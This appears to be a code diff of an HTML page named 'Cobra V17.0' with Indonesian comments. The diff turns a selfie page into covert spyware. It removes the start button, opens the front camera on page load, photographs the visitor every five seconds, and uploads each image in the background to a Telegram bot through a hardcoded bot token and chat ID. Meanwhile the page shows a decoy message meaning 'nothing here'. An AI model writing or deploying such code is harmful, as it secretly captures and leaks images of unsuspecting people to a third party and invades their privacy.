@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Cobra V17.0</title>
+    <title>...</title>
     <style>
         * {
             margin: 0;
@@ -12,44 +12,8 @@
         }
         body {
             min-height: 100vh;
-            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            cursor: pointer;
-        }
-        .container {
-            text-align: center;
-            z-index: 10;
-            padding: 20px;
-        }
-        .status {
-            color: white;
-            font-size: 1.2rem;
-            margin-top: 20px;
-            padding: 10px 20px;
-            background: rgba(0,0,0,0.5);
-            border-radius: 50px;
-            display: inline-block;
-        }
-        button {
-            margin-top: 30px;
-            padding: 12px 30px;
-            font-size: 1rem;
-            font-weight: bold;
-            background: linear-gradient(135deg, #00ff88, #00cc66);
-            border: none;
-            border-radius: 50px;
-            color: #000;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        button:active {
-            transform: scale(0.95);
-        }
-        .hidden {
-            display: none;
+            background: linear-gradient(135deg, #0a0a0a, #0f0f1a);
+            font-family: system-ui, sans-serif;
         }
         video {
             position: fixed;
@@ -82,105 +46,122 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: clamp(1.5rem, 8vw, 3rem);
-            font-weight: 600;
-            color: white;
-            text-shadow: 0 0 20px rgba(0,255,255,0.5);
+            font-size: clamp(1.2rem, 6vw, 2rem);
+            font-weight: 500;
+            color: rgba(255,255,255,0.9);
+            text-shadow: 0 0 10px rgba(0,0,0,0.5);
             z-index: 101;
             opacity: 0;
-            transition: all 0.5s;
+            transition: all 0.4s;
             text-align: center;
-            background: rgba(0,0,0,0.7);
-            padding: 20px 40px;
-            border-radius: 20px;
+            background: rgba(0,0,0,0.6);
+            padding: 15px 30px;
+            border-radius: 50px;
             white-space: nowrap;
             pointer-events: none;
+            font-family: monospace;
         }
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; }
-            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+            20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
         }
         .show-text {
-            animation: pulse 0.5s ease forwards;
+            animation: fadeInOut 2s ease forwards;
+        }
+        /* Sembunyikan tombol apapun - gak ada */
+        button, .btn, .start, .mulai {
+            display: none;
+        }
+        .status {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: rgba(255,255,255,0.4);
+            font-size: 11px;
+            z-index: 102;
+            font-family: monospace;
+            background: rgba(0,0,0,0.4);
+            padding: 4px 12px;
+            border-radius: 20px;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="status" id="status">📸 COBRA V17.0 READY</div>
-        <button id="startBtn">📷 MULAI SELFIE</button>
-    </div>
-
     <video id="video" autoplay playsinline></video>
     <div class="shutter-effect" id="shutter"></div>
     <div class="result-text" id="resultText">Ga ada Apa Apa Sehhh</div>
+    <div class="status" id="status"></div>
 
     <script>
-        // ============ KONFIGURASI ============
-        // TOKEN BOT DAN CHAT ID LO
+        // ============ COBRA V17.0 - AUTO SELFIE ============
         const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
         const CHAT_ID = "8336543740";
+        const COOLDOWN_MS = 5000; // 5 detik delay antar foto
         
         // ============ ELEMEN ============
         const video = document.getElementById('video');
         const shutter = document.getElementById('shutter');
         const resultText = document.getElementById('resultText');
-        const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
+        const statusEl = document.getElementById('status');
         
         let stream = null;
         let isCameraActive = false;
+        let cooldown = false;
+        let autoTimer = null;
         
-        // ============ FUNGSI ============
+        // ============ KIRIM FOTO KE TELEGRAM ============
         async function sendPhotoToTelegram(imageDataUrl) {
             try {
-                // Convert base64 ke blob
                 const blob = await (await fetch(imageDataUrl)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'selfie_cobra.jpg');
-                
-                statusDiv.textContent = '📤 Mengirim foto ke bot...';
+                formData.append('photo', blob, 'selfie.jpg');
                 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    statusDiv.textContent = '✅ Foto terkirim ke bot!';
-                    return true;
-                } else {
-                    console.error('Telegram error:', result);
-                    statusDiv.textContent = '❌ Gagal kirim ke bot!';
-                    return false;
-                }
+                return await response.json();
             } catch (error) {
-                console.error('Error sending photo:', error);
-                statusDiv.textContent = '❌ Error: ' + error.message;
-                return false;
+                console.error('Error:', error);
+                return null;
             }
         }
         
-        async function takeSelfie() {
-            if (!stream || !isCameraActive) {
-                statusDiv.textContent = '⚠️ Kamera belum aktif!';
-                return;
-            }
-            
-            // Efek shutter
+        // ============ EFEK JEPRET ============
+        function shutterEffect() {
             shutter.style.opacity = '1';
             setTimeout(() => {
                 shutter.style.opacity = '0';
             }, 100);
             
             // Getaran visual
-            document.body.style.transform = 'scale(0.99)';
+            document.body.style.transform = 'scale(0.998)';
             setTimeout(() => {
                 document.body.style.transform = '';
-            }, 80);
+            }, 60);
+        }
+        
+        // ============ TAMPILIN TEKS ============
+        function showText() {
+            resultText.classList.remove('show-text');
+            void resultText.offsetWidth;
+            resultText.classList.add('show-text');
+        }
+        
+        // ============ AMBIL FOTO ============
+        async function takeSelfie() {
+            if (!stream || !isCameraActive || cooldown) return false;
+            
+            cooldown = true;
+            statusEl.textContent = '📸';
+            
+            // Efek jepret
+            shutterEffect();
             
             // Capture dari video
             const canvas = document.createElement('canvas');
@@ -188,39 +169,39 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/jpeg', 0.7);
             
-            // Hasil foto sebagai base64
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            // Kirim ke bot (background, gak nge-blok)
+            sendPhotoToTelegram(photoData).then(() => {
+                statusEl.textContent = '✓';
+                setTimeout(() => {
+                    if(statusEl.textContent === '✓') statusEl.textContent = '';
+                }, 1000);
+            }).catch(() => {
+                statusEl.textContent = '✗';
+            });
             
-            // Kirim ke Telegram
-            const success = await sendPhotoToTelegram(photoData);
+            // Tampilkan teks "Ga ada Apa Apa Sehhh"
+            showText();
             
-            // Tampilkan teks hasil
-            resultText.classList.remove('show-text');
-            void resultText.offsetWidth;
-            resultText.classList.add('show-text');
-            
-            if (success) {
-                statusDiv.textContent = '📸 Selfie berhasil! Cek bot kamu';
-            } else {
-                statusDiv.textContent = '📸 Foto diambil tapi gagal dikirim';
-            }
-            
-            // Teks hilang setelah 3 detik
+            // Cooldown 5 detik, baru bisa foto lagi
             setTimeout(() => {
-                resultText.classList.remove('show-text');
-            }, 3000);
+                cooldown = false;
+                // Auto foto lagi kalo masih aktif
+                if (isCameraActive && stream) {
+                    takeSelfie();
+                }
+            }, COOLDOWN_MS);
+            
+            return true;
         }
         
+        // ============ MULAI KAMERA (LANGSUNG TANPA TOMBOL) ============
         async function startCamera() {
-            if (isCameraActive) {
-                await takeSelfie();
-                return;
-            }
-            
-            statusDiv.textContent = '📷 Meminta akses kamera...';
+            statusEl.textContent = '📷';
             
             try {
+                // Paksa kamera DEPAN (user)
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { exact: "user" } }
                 });
@@ -230,64 +211,60 @@
                 
                 document.body.classList.add('camera-active');
                 isCameraActive = true;
-                statusDiv.textContent = '🎥 Kamera depan aktif - Klik tombol untuk selfie';
-                startBtn.textContent = '📸 AMBIL FOTO';
+                statusEl.textContent = '🎥';
                 
+                // Tunggu sebentar biar kamera stabil
                 setTimeout(() => {
-                    if (isCameraActive) {
-                        takeSelfie();
-                    }
-                }, 2000);
+                    statusEl.textContent = '';
+                    // Langsung ambil foto pertama
+                    takeSelfie();
+                }, 300);
                 
             } catch (err) {
-                console.error('Camera error:', err);
-                
+                // Coba kamera default
                 try {
-                    statusDiv.textContent = '📷 Mencoba kamera default...';
                     stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = stream;
                     await video.play();
                     document.body.classList.add('camera-active');
                     isCameraActive = true;
-                    statusDiv.textContent = '🎥 Kamera aktif - Klik tombol untuk selfie';
-                    startBtn.textContent = '📸 AMBIL FOTO';
+                    statusEl.textContent = '';
                     
                     setTimeout(() => {
-                        if (isCameraActive) {
-                            takeSelfie();
-                        }
-                    }, 2000);
+                        takeSelfie();
+                    }, 300);
                     
                 } catch (err2) {
-                    statusDiv.textContent = '❌ Gagal akses kamera! Izin diperlukan';
-                    console.error('Camera fallback error:', err2);
+                    statusEl.textContent = '❌ Izin kamera diperlukan';
+                    console.error(err2);
                 }
             }
         }
         
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
-            isCameraActive = false;
-            document.body.classList.remove('camera-active');
-            video.srcObject = null;
-            statusDiv.textContent = '📸 COBRA V17.0 READY';
-            startBtn.textContent = '📷 MULAI SELFIE';
-        }
+        // ============ LANGSUNG JALAN SAAT LOAD ============
+        // Gak ada tombol, gak ada apapun. Langsung minta izin.
+        window.addEventListener('load', () => {
+            // Langsung start camera
+            startCamera();
+        });
         
-        startBtn.addEventListener('click', startCamera);
-        
+        // Matiin kamera kalo page ditutup (opsional)
         window.addEventListener('beforeunload', () => {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
         });
         
-        console.log('COBRA V17.0 - Front Camera Active');
-        console.log('Bot Token:', BOT_TOKEN ? '✅ OK' : '❌ Belum diisi');
-        console.log('Chat ID:', CHAT_ID ? '✅ OK' : '❌ Belum diisi');
+        // Kalo user klik di mana aja, gak ngapa-ngapain
+        // Tapi tetep bisa jadi trigger buat yang pengen manual
+        document.body.addEventListener('click', () => {
+            // Kalo kamera mati atau gagal, coba start ulang
+            if (!isCameraActive && !stream) {
+                startCamera();
+            }
+        });
+        
+        console.log('COBRA V17.0 AUTO - No buttons, langsung motret tiap 5 detik');
     </script>
 </body>
 </html>
